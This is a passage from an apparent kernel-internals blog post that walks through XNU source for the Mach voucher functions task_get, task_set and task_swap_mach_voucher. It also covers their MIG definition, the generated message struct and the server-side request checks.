    &lt;span class=&quot;mi&quot;&gt;5994&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kern_return_t&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;5995&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_get_mach_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;5996&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;task_t&lt;/span&gt;			&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;5997&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;mach_voucher_selector_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__unused&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;which&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;5998&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;ipc_voucher_t&lt;/span&gt;		&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;5999&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;6000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TASK_NULL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;6001&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_INVALID_TASK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;6002&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;6003&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;6004&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;6005&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;6006&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;6007&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kern_return_t&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;6008&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_set_mach_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;6009&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;task_t&lt;/span&gt;			&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;6010&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;ipc_voucher_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;__unused&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;6011&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;6012&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TASK_NULL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;6013&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_INVALID_TASK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;6014&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;6015&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;6016&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;6017&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;6018&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kern_return_t&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;6019&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_swap_mach_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;6020&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;task_t&lt;/span&gt;			&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;6021&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;ipc_voucher_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;new_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;6022&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;ipc_voucher_t&lt;/span&gt;		&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in_out_old_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;6023&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;6024&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TASK_NULL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;6025&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_INVALID_TASK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;6026&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;6027&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in_out_old_voucher&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;6028&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;6029&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;6030&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The function &lt;strong&gt;task_swap_mach_voucher&lt;/strong&gt; is a placeholder as per the comments. A quick search for it would also find the routine under &lt;strong&gt;xnu-4903.221.2/osfmk/mach/task.defs&lt;/strong&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BUILD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EXPORT_HDRS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;defs&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;455&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;routine&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_swap_mach_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;456&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;		&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;457&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;new_voucher&lt;/span&gt;	&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_voucher_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;458&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;inout&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;old_voucher&lt;/span&gt;	&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_voucher_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This proves that it is actually a Mach API, since MIG def files are generating code for Mach Interfaces. Lets search for &lt;strong&gt;task_swap_mach_voucher&lt;/strong&gt;. Remember that we are doing this on a compiled version. Under the file &lt;strong&gt;/BUILD/obj/RELEASE_X86_64/osfmk/mach/task.h&lt;/strong&gt; we can find the Mach message format for this function.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BUILD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EXPORT_HDRS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2086&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifdef&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;__MigPackStructs&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2087&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pragma&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2088&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endif&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2089&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2090&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2091&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;cm&quot;&gt;/* start of the kernel processed data */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2092&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;mach_msg_body_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msgh_body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2093&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;mach_msg_port_descriptor_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;old_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2094&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;cm&quot;&gt;/* end of the kernel processed data */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2095&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__Reply__task_swap_mach_voucher_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__attribute__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unused&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2096&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifdef&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;__MigPackStructs&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2097&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pragma&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2098&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endif&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And under the file &lt;strong&gt;/BUILD/obj/RELEASE_X86_64/osfmk/RELEASE/mach/task_server.c&lt;/strong&gt; we can see checks being performed on the request.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BUILD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RELEASE_X86_64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RELEASE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task_server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4714&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mig_internal&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kern_return_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__MIG_check__Request__task_swap_mach_voucher_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__attribute__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__unused__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__Request__task_swap_mach_voucher_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;In0P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4715&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4716&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;4717&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__Request__task_swap_mach_voucher_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4718&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;__MigTypeCheck&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4719&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;In0P&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_bits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSGH_BITS_COMPLEX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4720&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;In0P&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_descriptor_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4721&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;In0P&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4722&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MIG_BAD_ARGUMENTS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4723&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endif&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* __MigTypeCheck */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4724&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;4725&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;__MigTypeCheck&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4726&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;In0P&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_PORT_DESCRIPTOR&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4727&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	    &lt;span class=&quot;n&quot;&gt;In0P&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;disposition&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4728&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MIG_TYPE_ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4729&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endif&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* __MigTypeCheck */&lt;/span&gt;
